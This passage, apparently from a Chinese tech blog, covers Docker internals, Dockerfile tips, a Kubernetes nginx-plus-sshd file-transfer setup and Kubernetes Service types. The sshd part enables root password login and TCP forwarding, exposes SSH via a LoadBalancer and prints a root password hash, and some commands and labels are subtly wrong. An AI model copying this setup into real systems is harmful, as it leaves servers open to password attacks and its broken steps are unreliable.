都可以实现网络的互相通信</p><p>不同点:</p><ul><li>macvlan是内核支持模块，无需安装第三方插件，只需加载模块即可，overlay需要安装第三方插件consul;</li><li>macvlan需要手动分配IP地址，而overlay网络无需手动分配IP地址;</li><li>macvlan默认无法访问外网，需要手动配置桥接网络，而overlay默认可以访问外网;</li></ul><p><strong>docker网络不足的总结</strong></p><ul><li>1.docker在网络互联上存在缺陷，比如overlay网络各节点实现IP地址通信，当容器挂掉时，会自动为该容器分配IP地址。若容器重 启后，IP地址可能发生变化;</li><li>2.若配置文件写的都是IP地址，则容器重启后IP地址发生变化，可能导致服务不可用;</li></ul><h1 id="七、docker底层使用的linux技术"><a href="#七、docker底层使用的linux技术" class="headerlink" title="七、docker底层使用的linux技术"></a>七、docker底层使用的linux技术</h1><p> Docker 是用Go 编程语言编写的，并利用 Linux 内核的几个特性来提供其功能。</p><p> Docker 使用一种称为容器 <code>namespaces </code>的技术来提供隔离的工作空间。当您运行容器时，      Docker 会为该容器创建一组 命名空间<em>。</em></p><p> 这些命名空间提供了一层隔离。容器的每个方面都在单独的命名空间中运行，并且它的访问权限仅限于该命名空间。</p><p> Docker底层的核心技术包括</p><ul><li>Linux 上的名字空间（Namespaces）</li><li>控制组（Control groups）</li><li>Union 文件系统（Union file systems）</li><li>容器格式（Container format）</li></ul><h3 id="namespace"><a href="#namespace" class="headerlink" title="namespace"></a>namespace</h3><p>NameSpace 是 Linux 内核一个强大的特性。每个容器都有自己单独的名字空间，运行在其中的应用都像是在独立的操作系统中运行一样。名字空间保证了容器之间彼此互不影响。</p><ul><li>pid 名字空间<br> 不同用户的进程就是通过 pid 名字空间隔离开的，且不同名字空间中可以有相同 pid。所有的 LXC 进程在Docker 中的父进程为Docker进程，每个 LXC 进程具有不同的名字空间。同时由于允许嵌套，因此可以很方便的实现嵌套的 Docker 容器。</li><li>net 名字空间<br> 有了 pid 名字空间, 每个名字空间中的 pid 能够相互隔离，但是网络端口还是共享 host 的端口。网络隔离是通过 net 名字空间实现的， 每个 net 名字空间有独立的 网络设备, IP 地址, 路由表, &#x2F;proc&#x2F;net 目录。这样每个容器的网络就能隔离开来。Docker 默认采用 veth 的方式，将容器中的虚拟网卡同 host 上的一 个Docker网桥 docker0 连接在一起。</li><li>ipc 名字空间<br> 容器中进程交互还是采用了 Linux 常见的进程间交互方法(interprocess communication – IPC), 包括信号量、消息队列和共享内存等。然而同 VM 不同的是，容器的进程间交互实际上还是 host 上具有相同 pid 名字空间中的进程间交互，因此需要在 IPC 资源申请时加入名字空间信息，每个 IPC 资源有一个唯一的 32位 id。</li><li>mnt 名字空间<br> 类似 chroot，将一个进程放到一个特定的目录执行。mnt 名字空间允许不同名字空间的进程看到的文件结构不同，这样每个名字空间 中的进程所看到的文件目录就被隔离开了。同 chroot 不同，每个名字空间中的容器在 &#x2F;proc&#x2F;mounts 的信息只包含所在名字空间的 mount point。</li><li>uts 名字空间<br> UTS(“UNIX Time-sharing System”) 名字空间允许每个容器拥有独立的 hostname 和 domain name, 使其在网络上可以被视作一个独立的节点而非 主机上的一个进程。</li><li>user 名字空间<br> 每个容器可以有不同的用户和组 id, 也就是说可以在容器内用容器内部的用户执行程序而非主机上的用户。</li></ul><h3 id="cgroups"><a href="#cgroups" class="headerlink" title="cgroups"></a>cgroups</h3><p>cgroups 是 Linux 内核的一个特性，主要用来对共享资源进行隔离、限制、审计等。只有能控制分配到容器的资源，才能避免当多个容器同时运行时的对系统资源的竞争。</p><p>cgroups 技术最早是由 Google 的程序员 2006 年起提出，Linux 内核自 2.6.24 开始支持。</p><p>cgroups 可以提供对容器的内存、CPU、磁盘 IO 等资源的限制和审计管理。</p><h3 id="unionfs"><a href="#unionfs" class="headerlink" title="unionfs"></a>unionfs</h3><p>联合文件系统（UnionFS）是一种分层、轻量级并且高性能的文件系统，它支持对文件系统的修改作为一次提交来一层层的叠加，同时可以将不同目录挂载到同一个虚拟文件系统下(unite several directories into asingle virtual filesystem)。</p><p>联合文件系统是 Docker 镜像的基础。镜像可以通过分层来进行继承，基于基础镜像（没有父镜像），可以制作各种具体的应用镜像。</p><p>另外，不同 Docker 容器就可以共享一些基础的文件系统层，同时再加上自己独有的改动层，大大提高了存储的效率。</p><p>Docker 中使用的 AUFS（AnotherUnionFS）就是一种联合文件系统。 AUFS 支持为每一个成员目录（类似 Git 的分支）设定只读（readonly）、读写（readwrite）和写出（whiteout-able）权限, 同时 AUFS 里有一个类似分层的概念, 对只读权限的分支可以逻辑上进行增量地修改(不影响只读部分的)。</p><p>Docker 目前支持的联合文件系统种类包括 AUFS, btrfs, vfs 和 DeviceMapper。</p><h3 id="容器格式"><a href="#容器格式" class="headerlink" title="容器格式"></a>容器格式</h3><p>最初，Docker 采用了 LXC 中的容器格式。自 1.20 版本开始，Docker 也开始支持新的 libcontainer 格式，并作为默认选项。</p><h1 id="八、dockerfile"><a href="#八、dockerfile" class="headerlink" title="八、dockerfile"></a>八、dockerfile</h1><p>Dockerfile是用来快速创建自定义镜像的一种文本格式的配置文件，在持续集成和持续部署时，需要使用Dockerfile生成相关应用程序的镜像。</p><h3 id="Dockerfile的常用命令"><a href="#Dockerfile的常用命令" class="headerlink" title="Dockerfile的常用命令"></a><strong>Dockerfile的常用命令</strong></h3><blockquote><p>FROM：继承基础镜像<br> MAINTAINER：镜像制作作者的信息，已弃用，使用LABEL替代<br> LABEL：k&#x3D;v形式，将一些元数据添加至镜像<br> RUN：用来执行shell命令<br> EXPOSE：暴露端口号<br> CMD：启动容器默认执行的命令，会被覆盖<br> ENTRYPOINT：启动容器真正执行的命令，不会被覆盖<br> VOLUME：创建挂载点ENV：配置环境变量<br> ADD：复制文件到容器，一般复制文件，压缩包自动解压<br> COPY：复制文件到容器，一般复制目录<br> WORKDIR：设置容器的工作目录<br> USER：容器使用的用户ARG：设置编译镜像时传入的参数</p></blockquote><h3 id="jar包打镜像案例"><a href="#jar包打镜像案例" class="headerlink" title="jar包打镜像案例"></a><strong>jar包打镜像案例</strong></h3><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> java:graalvm-ce-java8-<span class="hljs-number">21.2</span>.<span class="hljs-number">0</span><br><br><span class="hljs-keyword">ENV</span> LANG C.UTF-<span class="hljs-number">8</span><br><span class="hljs-keyword">ENV</span> TZ=Asia/Shanghai<br><br><span class="hljs-keyword">ADD</span><span class="language-bash"> contract-online-sign-server/target/*.jar /app.jar</span><br><br><span class="hljs-keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="hljs-string">&quot;java&quot;</span>, <span class="hljs-string">&quot;-jar&quot;</span>,<span class="hljs-string">&quot;/app.jar&quot;</span>]</span><br></code></pre></td></tr></table></figure><h3 id="env和arg指令有什么区别？"><a href="#env和arg指令有什么区别？" class="headerlink" title="env和arg指令有什么区别？"></a><strong>env和arg指令有什么区别？</strong></h3><blockquote><p>都是向容器传递环境变量<br> - arg是基于构建阶段传递环境变量<br> - env不仅可以用于构建阶段传递环境变量还可以用于容器运行时传递环境变量</p></blockquote><h3 id="CMD和ENTRYPOINT有啥区别？"><a href="#CMD和ENTRYPOINT有啥区别？" class="headerlink" title="CMD和ENTRYPOINT有啥区别？"></a><strong>CMD和ENTRYPOINT有啥区别？</strong></h3><blockquote><p>都可以作为容器启动命令<br> - entrypoint指定可以将指定启动命令作为参数传递<br> - 他们两个一块使用的时候，cmd将作为传递参数，当然如果用户在运行时指定了启动命令，会覆盖cmd的add和copy区别？默认值</p></blockquote><h3 id="add和copy区别？"><a href="#add和copy区别？" class="headerlink" title="add和copy区别？"></a><strong>add和copy区别？</strong></h3><blockquote><p>都可以拷贝文件<br> - add在拷贝tar包文件会自动解压<br> - copy指令在多阶段构建的时候可以从其他节点拷贝数据</p></blockquote><h3 id="镜像优化思路？"><a href="#镜像优化思路？" class="headerlink" title="镜像优化思路？"></a>镜像优化思路？</h3><blockquote><p>编译速度:<br>   1.Dockefile在编译时，如果对应的指令记录被执行过，就可以直接使用缓存，因此将不频繁修改的指令往上放，将经常修改的指令往下放，以达到利用缓存的目的;<br>   2.忽略Docker编译时不必要文件;<br>   3.使用国内的软件源或本地仓库，以提示网络的下载速度;<br>   4.将比较大的软件包放在本地或内网的文件站点，避免下载;</p><p>镜像大小:<br>   1.删除缓存，无用的软件包以减少镜像大小;<br>   2.能够合并的指令，尽量合并，减少不必要的镜像分层，每一个Dockerfile指令都会产生一个中间层镜像(docker image ls -a);<br>   3.使用较小的基础镜像</p><p>  4.使用多阶段构建</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>云原生</category>
      
    </categories>
    
    
    <tags>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>k8s部署nginx+sshd实现文件上传下载</title>
    <link href="/2025/04/16/k8s%E9%83%A8%E7%BD%B2nginx-sshd%E5%AE%9E%E7%8E%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD/"/>
    <url>/2025/04/16/k8s%E9%83%A8%E7%BD%B2nginx-sshd%E5%AE%9E%E7%8E%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD/</url>
    
    <content type="html"><![CDATA[<p>要通过 <code>nginx</code> 和 <code>sshd</code> 实现文件的上传和下载，通常的做法是结合 SSH 协议和 HTTP 协议，使用 <code>nginx</code> 提供 Web 服务器功能，同时使用 <code>sshd</code>（即 SSH 服务）来处理通过 SSH 协议进行的文件传输。</p><ul><li><p>SSH 实现文件的上传和下载： 通过 <code>sshd</code> 实现文件上传和下载通常使用 SCP 或 SFTP 协议。你可以通过 SSH 客户端将文件上传到服务器，或从服务器下载文件。这个过程不依赖于 <code>nginx</code>，但你可以通过 <code>nginx</code> 提供 Web 界面来管理文件传输。</p></li><li><p>nginx 提供 Web 界面进行文件上传和下载： <code>nginx</code> 本身并不直接处理文件上传功能，但你可以配合一些后端服务（如 PHP、Python、Node.js 等）来实现文件上传和下载的 Web 界面。</p></li></ul><h3 id="一、准备工作"><a href="#一、准备工作" class="headerlink" title="一、准备工作"></a>一、准备工作</h3><p><strong>思路</strong></p><p>在同个pod部署nginx和sshd服务，然后共享一个存储卷即可</p><p><strong>准备nginx和ssd的镜像</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker pull nginx:stable-alpine<br>docker pull circleci/sshd:0.1<br></code></pre></td></tr></table></figure><p> <strong>共享目录</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/usr/share/nginx/html<br></code></pre></td></tr></table></figure><p><strong>示意图</strong><br><img src="https://gitee.com/ljh00928/csdn/raw/master/img/4a2031994d8c4329b0a1d1bccacec958.png" alt="在这里插入图片描述"></p><h3 id="二、配置共享存储"><a href="#二、配置共享存储" class="headerlink" title="二、配置共享存储"></a>二、配置共享存储</h3><p><strong>创建一个 PVC 来请求共享存储</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local ~]# nginx-ssh-pvc.yaml<br>apiVersion: v1<br>kind: PersistentVolumeClaim<br>metadata:<br>  name: shared-pvc<br>spec:<br>  accessModes:<br>    - ReadWriteMany  <span class="hljs-comment"># 允许多个容器读写同一存储</span><br>  resources:<br>    requests:<br>      storage: 5Gi  <span class="hljs-comment"># 存储大小可以根据需要调整</span><br><br></code></pre></td></tr></table></figure><p><strong>部署 PVC</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl apply -f nginx-ssh-pvc.yaml<br></code></pre></td></tr></table></figure><h3 id="三、sshd打docker镜像"><a href="#三、sshd打docker镜像" class="headerlink" title="三、sshd打docker镜像"></a><strong>三、sshd打docker镜像</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查看目录</span><br>[root@node1.local sshd]# ll<br>total 20<br>drwxr-xr-x  2 root root 4096 Dec 24 13:50 ./<br>drwx------ 33 root root 4096 Dec 30 16:52 ../<br>-rw-r--r--  1 root root  174 Dec 24 12:00 Dockerfile<br>-rw-r--r--  1 root root  591 Dec 24 11:48 shadow<br>-rw-r--r--  1 root root  140 Dec 24 13:32 sshd_config<br><br><span class="hljs-comment">#生成加密密码</span><br>[root@node1.local sshd]# openssl passwd -6<br>Password: <br>Verifying - Password: <br>$6$YiALKQwJcDubTbBn<span class="hljs-variable">$OEKLYvJfA8vkXAbgCGqTonP</span>.hz5v4/gDcdvDJx0xHGiHlU.Obqpgji0m5tt1vHcTsUlqnFaMSzNiBlnn0USQZ0<br><br><span class="hljs-comment">#设置root密码</span><br>[root@node1.local sshd]# <span class="hljs-built_in">cat</span> shadow <br>root:$6$YiALKQwJcDubTbBn<span class="hljs-variable">$OEKLYvJfA8vkXAbgCGqTonP</span>.hz5v4/gDcdvDJx0xHGiHlU.Obqpgji0m5tt1vHcTsUlqnFaMSzNiBlnn0USQZ0:20081:0:::::<br>bin:!::0:::::<br>...<br><br><span class="hljs-comment">#将配置文件添加到容器</span><br>[root@node1.local sshd]# <span class="hljs-built_in">cat</span> sshd_config <br>UsePAM <span class="hljs-built_in">yes</span><br>PasswordAuthentication <span class="hljs-built_in">yes</span><br>PermitEmptyPasswords no<br>ChallengeResponseAuthentication no<br>PermitRootLogin <span class="hljs-built_in">yes</span><br>AllowTcpForwarding <span class="hljs-built_in">yes</span><br></code></pre></td></tr></table></figure><p><strong>编写dockerfile</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local sshd]# <span class="hljs-built_in">cat</span> Dockerfile <br>FROM harbor.cherry.com/sshd/sshd:0.1<br><br>COPY shadow /etc/shadow<br>COPY sshd_config /etc/ssh/sshd_config<br><br>ENV TZ=Asia/Shanghai<br><br>RUN <span class="hljs-built_in">chmod</span> 640 /etc/shadow<br></code></pre></td></tr></table></figure><p><strong>打镜像</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker build -t . sshd:v2<br></code></pre></td></tr></table></figure><p><strong>推送harbor仓库</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker tag sshd:v2 harbor.cherry.com/sshd/sshd:2<br>docker push harbor.cherry.com/sshd/sshd:2<br></code></pre></td></tr></table></figure><h3 id="四、部署-Nginx-和-SSH"><a href="#四、部署-Nginx-和-SSH" class="headerlink" title="四、部署 Nginx 和 SSH"></a>四、部署 Nginx 和 SSH</h3><p>在同个pod中来运行 Nginx 和 SSH 服务，并使用共享的 PVC 挂载文件存储</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local ~]# nginx-ssh-pod.yaml<br>apiVersion: v1<br>kind: Pod<br>metadata:<br>  name: nginx-ssh-pod<br>spec:<br>  containers:<br>  - name: nginx<br>    image: nginx:stable-alpine  <span class="hljs-comment"># 使用官方 Nginx 镜像</span><br>    ports:<br>      - containerPort: 80<br>    volumeMounts:<br>      - name: shared-storage<br>        mountPath: /usr/share/nginx/html  <span class="hljs-comment"># 共享目录，用于提供文件下载</span><br>  - name: ssh<br>    image: harbor.cherry.com/sshd/sshd:2  <span class="hljs-comment"># 使用自定义的 SSH 镜像</span><br>    ports:<br>      - containerPort: 22<br>    volumeMounts:<br>      - name: shared-storage<br>        mountPath: /usr/share/nginx/html  <span class="hljs-comment"># 共享目录，用于文件上传</span><br>  volumes:<br>    - name: shared-storage<br>      persistentVolumeClaim:<br>        claimName: shared-pvc  <span class="hljs-comment"># 使用上面创建的 PVC</span><br><br></code></pre></td></tr></table></figure><p>此配置文件定义了一个包含两个容器的 Pod：</p><ul><li>Nginx 容器：它提供文件下载服务，将 <code>/usr/share/nginx/html</code> 目录挂载到共享存储。</li><li>SSH 容器：它提供文件上传服务，将<code>/usr/share/nginx/html</code>目录挂载到共享存储</li></ul><p><strong>部署pod</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl apply -f nginx-ssh-pod.yaml<br></code></pre></td></tr></table></figure><h3 id="五、暴露-Nginx-和-SSH-服务"><a href="#五、暴露-Nginx-和-SSH-服务" class="headerlink" title="五、暴露 Nginx 和 SSH 服务"></a>五、暴露 Nginx 和 SSH 服务</h3><p><strong>创建 Nginx Service</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local ~]# nginx-service.yaml<br>apiVersion: v1<br>kind: Service<br>metadata:<br>  name: nginx-service<br>spec:<br>  selector:<br>    app: nginx-ssh-pod<br>  ports:<br>    - protocol: TCP<br>      port: 80<br>      targetPort: 80<br>  <span class="hljs-built_in">type</span>: LoadBalancer<br></code></pre></td></tr></table></figure><p><strong>创建 SSH Service</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@node1.local ~]# ssh-service.yaml<br>apiVersion: v1<br>kind: Service<br>metadata:<br>  name: ssh-service<br>spec:<br>  selector:<br>    app: nginx-ssh-pod<br>  ports:<br>    - protocol: TCP<br>      port: 22<br>      targetPort: 22<br>  <span class="hljs-built_in">type</span>: LoadBalancer <br></code></pre></td></tr></table></figure><h3 id="六、访问使用"><a href="#六、访问使用" class="headerlink" title="六、访问使用"></a>六、访问使用</h3><ul><li><strong>文件下载</strong>：可以通过直接访问web界面 http:&#x2F;&#x2F;<nginx-service-ip>&#x2F;files&#x2F;来下载文件。</li><li><strong>文件上传</strong>：可以通过winscp来实现上传文件</li></ul>]]></content>
    
    
    <categories>
      
      <category>云原生</category>
      
    </categories>
    
    
    <tags>
      
      <tag>k8s</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>K8s 网络机制</title>
    <link href="/2025/04/16/K8s-%E7%BD%91%E7%BB%9C%E6%9C%BA%E5%88%B6/"/>
    <url>/2025/04/16/K8s-%E7%BD%91%E7%BB%9C%E6%9C%BA%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Service 作为 K8s 中的一等公民，其承载了核心容器网络的访问管理能力，包括：</p><ul><li>暴露&#x2F;访问一组 Pod 的能力</li><li>Pod 访问集群内、集群外服务</li><li>集群外客户端访问集群内 Pod 的服务</li></ul><p>无论是作为应用的开发者还是使用者，一般都需要先经过 Service 才会访问到真正的目标 Pod。因此熟悉 Service 网络管理机制将会使我们更加深入理解 K8s 的容器编排原理，</p><p>本文将从 K8s 中容器网络、Service&#x2F;Pod 关联、Service 类型、kube-proxy 模式、Ingress 等方面，说明 Service 的网络机制。</p><h1 id="一、Service类型"><a href="#一、Service类型" class="headerlink" title="一、Service类型"></a>一、Service类型</h1><table><thead><tr><th>类型</th><th>应用场景</th></tr></thead><tbody><tr><td>CLusterIP</td><td>K8S集群内部相互访问</td></tr><tr><td>NodePort</td><td>K8S集群外部实现访问</td></tr><tr><td>LoadBalancer</td><td>云环境中使用，比如K8S在阿里云，腾讯云，京东云，华为云等。对应的云产品都有自己的负载均衡器产品</td></tr><tr><td>ExternerName</td><td>SVC代理的服务并不在K8S集群内部，而是在K8S集群外部</td></tr></tbody></table><p> <img src="https://gitee.com/ljh00928/csdn/raw/master/img/7dd7d9de57bd46bda0f4f2fba82e6ad5.png" alt="img"> <strong>ClusterIP</strong></p><p>ClusterIP 表示在 K8s 集群内部通过 service.spec.clusterIP 进行访问，之后经过 kube-proxy 负载均衡到目标 Pod。</p><p>无头服务 (Headless Service)：<br> 当指定 Service 的 ClusterIP &#x3D; None 时，则创建的 Service 不会生成 ClusterIP，这样 Service 域名在解析的时候，将直接解析到对应的后端 Pod (一个或多个)，某些业务如果不想走 Service 默认的负载均衡，则可采用此种方式 直连 Pod。</p><blockquote><p>&#x2F;&#x2F; service.spec.publishNotReadyAddresses：表示是否将没有 ready 的 Pods 关联到 Service，默认为 false。设置此字段的主要场景是为 StatefulSet 的 Service 提供支持，使之能够为其 Pod 传播 SRV DNS 记录，以实现对等发现。</p></blockquote><p> 当没有指定 service.type 时，默认类型为 ClusterIP。</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> <span class="hljs-params">v1kind:</span> <span class="hljs-params">Servicemetadata:</span>  <span class="hljs-params">name:</span> <span class="hljs-params">headless-servicespec:</span>  <span class="hljs-params">selector:</span>    <span class="hljs-params">app:</span> nginx  <span class="hljs-params">ports:</span>    <span class="hljs-operator">-</span> <span class="hljs-params">protocol:</span> TCP      <span class="hljs-params">port:</span> <span class="hljs-number">80</span>      <span class="hljs-params">targetPort:</span> <span class="hljs-number">80</span>  <span class="hljs-params">type:</span> ClusterIP <span class="hljs-comment"># 默认类型，可省略  clusterIP: None # 指定 ClusterIP = None  publishNotReadyAddresses: true # 是否关联未 ready pods</span><br></code></pre></td></tr></table></figure><h2 id="NodePort"><a href="#NodePort" class="headerlink" title="NodePort"></a>NodePort</h2><p>当业务需要从 K8s 集群外访问内部服务时，通过 NodePort 方式可以先将访问流量转发到对应的 Node IP，然后再通过 service.spec.ports[].nodePort 端口，通过 kube-proxy 负载均衡到目标 Pod。</p><blockquote><p>Service NodePort 默认端口范围：30000-32767，共 2768 个端口。<br> 可通过 kube-apiserver 组件的 <code>--service-node-port-range</code> 参数进行配置。</p><p>[root@master231 ~]# vim &#x2F;etc&#x2F;kubernetes&#x2F;manifests&#x2F;kube-apiserver.yaml<br> …<br> spec:<br>  containers:<br>  - command:<br>   - kube-apiserver<br>   - –service-node-port-range&#x3D;3000-50000  # 进行添加这一行即可</p></blockquote><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> <span class="hljs-params">v1kind:</span> <span class="hljs-params">Servicemetadata:</span>  <span class="hljs-params">name:</span> <span class="hljs-params">nodeport-servicespec:</span>  <span class="hljs-params">selector:</span>    <span class="hljs-params">app:</span> nginx  <span class="hljs-params">ports:</span>    <span class="hljs-operator">-</span> <span class="hljs-params">nodePort:</span> <span class="hljs-number">30800</span>   <span class="hljs-comment">#worker节点的端口映射      port: 8080        #对应的svc的port端口      protocol: TCP           targetPort: 80    #对应的pod端口  type: NodePort</span><br></code></pre></td></tr></table></figure><h2 id="LoadBalancer"><a href="#LoadBalancer" class="headerlink" title="LoadBalancer"></a><strong>LoadBalancer</strong></h2><p>上面的 NodePort 方式访问内部服务，需要依赖具体的 Node 高可用，如果节点挂了则会影响业务访问，LoadBalancer 可以解决此问题。</p><p>具体来说，LoadBalancer 类型的 Service 创建后，由具体是云厂商或用户实现 externalIP (service.status.loadBalancer) 的分配，业务直接通过访问 externalIP，然后负载均衡到目标 Pod。</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> <span class="hljs-params">v1kind:</span> <span class="hljs-params">Servicemetadata:</span>  <span class="hljs-params">name:</span> <span class="hljs-params">my-servicespec:</span>  <span class="hljs-params">selector:</span>    app.kubernetes.io<span class="hljs-operator">/</span><span class="hljs-params">name:</span> MyApp  <span class="hljs-params">ports:</span>    <span class="hljs-operator">-</span> <span class="hljs-params">protocol:</span> TCP      <span class="hljs-params">nodePort:</span> <span class="hljs-number">30931</span>      <span class="hljs-params">port:</span> <span class="hljs-number">80</span>      <span class="hljs-params">targetPort:</span> <span class="hljs-number">9376</span>  <span class="hljs-params">clusterIP:</span> <span class="hljs-number">10.0</span>.<span class="hljs-number">171.239</span>  <span class="hljs-params">type:</span> <span class="hljs-params">LoadBalancerstatus:</span>  <span class="hljs-params">loadBalancer:</span>    <span class="hljs-params">ingress:</span>    <span class="hljs-operator">-</span> <span class="hljs-params">ip:</span> <span class="hljs-number">192.0</span>.<span class="hljs-number">2.127</span><br></code></pre></td></tr></table></figure><h2 id="ExternalName"><a href="#ExternalName" class="headerlink" title="ExternalName"></a>ExternalName</h2><p>当业务需要从 K8s 内部访问外部服务的时候，可以通过 ExternalName 的方式实现。Demo 如下</p><p>具体来说，service.spec.externalName 字段值会被解析为 DNS 对应的 CNAME 记录，之后就可以访问到外部对应的服务了</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">apiVersion:</span> <span class="hljs-params">v1kind:</span> Service  <span class="hljs-comment">#无selector，无endpointsmetadata:  name: my-service    namespace: prodspec:  type: ExternalName  externalName: my.database.example.com</span><br></code></pre></td></tr></table></figure><h1 id="二、容器网络机制"><a href="#二、容器网络机制" class="headerlink" title="二、容器网络机制"></a>二、容器网络机制</h1><p>K8s 将一组逻辑上紧密相关的容器，统一抽象为 Pod 概念，以共享 Pod Sandbox 的基础信息，如 Namespace 命名空间、IP 分配、Volume 存储（如 hostPath&#x2F;emptyDir&#x2F;PVC）等，因此讨论容器的网络访问机制，实际上可以用 Pod 访问机制代替。</p><p>根据 Pod 在集群内的分布情况，可将 Pod 的访问方式主要分为两种：</p><ul><li>同一个 Node 内 Pod 访问</li><li>跨 Node 间 Pod 访问</li></ul><h2 id="同一个-Node-内访问"><a href="#同一个-Node-内访问" class="headerlink" title="同一个 Node 内访问"></a>同一个 Node 内访问</h2><p>同一个 Node 内访问，表示两个或多个 Pod 落在同一个 Node 宿主机上，这种 Pod 彼此间访问将不会跨 Node，通过本机网络即可完成通信。</p><p>具体来说，Node 上的运行时如 Docker&#x2F;containerd 会在启动后创建默认的网桥 cbr0 (custom bridge)，以连接当前 Node 上管理的所有容器 (containers)。当 Pod 创建后，会在 Pod Sandbox 初始化基础网络时，调用 CNI bridge 插件创建 veth-pair（两张虚拟网卡），一张默认命名 eth0 (如果 hostNetwork &#x3D; false，则后续调用 CNI ipam 插件分配 IP)。另一张放在 Host 的 Root Network Namespace 内，然后连接到 cbr0。当 Pod 在同一个 Node 内通信访问的时候，直接通过 cbr0 即可完成网桥转发通信。</p><blockquote><p>访问流程：</p><ul><li>首先运行时如 Docker&#x2F;containerd 创建 cbr0；</li><li>Pod Sandbox 初始化调用 CNI bridge 插件创建 veth-pair（两张虚拟网卡）；</li><li>一张放在 Pod Sandbox 所在的 Network Namespace 内（CRI containerd 默认传的参数为 eth0）；</li><li>另一张放在 Host 的 Root Network Namespace 内，然后连接到 cbr0；</li><li>Pod 在同一个 Node 内访问直接通过 cbr0 网桥转发；</li></ul><p>&#x2F;&#x2F; docker中默认网桥名为docker 0，k8s中默认网桥名为cni 0</p></blockquote><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/e61a893bdeb7451aad260b4a5e15fa91.png" alt="img"></p><h2 id="跨-Node-间-Pod-访问"><a href="#跨-Node-间-Pod-访问" class="headerlink" 